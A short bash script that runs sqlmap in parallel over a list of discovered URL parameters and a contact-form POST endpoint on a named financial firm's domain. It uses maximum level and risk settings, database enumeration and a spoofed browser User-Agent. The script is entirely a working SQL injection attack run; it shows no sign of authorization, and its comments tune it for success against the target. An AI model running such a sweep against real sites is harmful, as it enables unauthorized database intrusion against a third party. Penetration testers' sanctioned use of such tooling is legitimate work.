#!/bin/bash
# sqlmap sweep — every discovered parameter.
# Key fix: Accept-Encoding: identity  -> avoids Brotli (sqlmap has no brotli module => truncated streams => false "unstable page")
O=/work/tool_outputs
mkdir -p $O/sqout
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
run(){
  name="$1"; shift
  sqlmap "$@" --batch --level=5 --risk=3 --dbs --threads=1 --flush-session \
    -H "User-Agent: $UA" -H "Accept: */*" -H "Accept-Encoding: identity" -H "Connection: close" \
    --output-dir=$O/sqout/$name > $O/sq_$name.log 2>&1
  echo "DONE $name rc=$? $(date +%T)" >> $O/sq_progress.txt
}

while IFS=$'\t' read -r name url; do
  run "get_$name" -u "$url" &
done < $O/sqli_targets.txt

run "post_send" -u 'https://www.infinitycapital.bh/api/send' \
  --data='fname=Sqlmap&lname=Probe&areacode=973&tel=5551234&cname=QA+Tester&subject=Hello&msg=Body+text&check=on&targets=probe%40example.com' &

wait
echo "ALL SQLMAP DONE $(date)" >> $O/sq_progress.txt
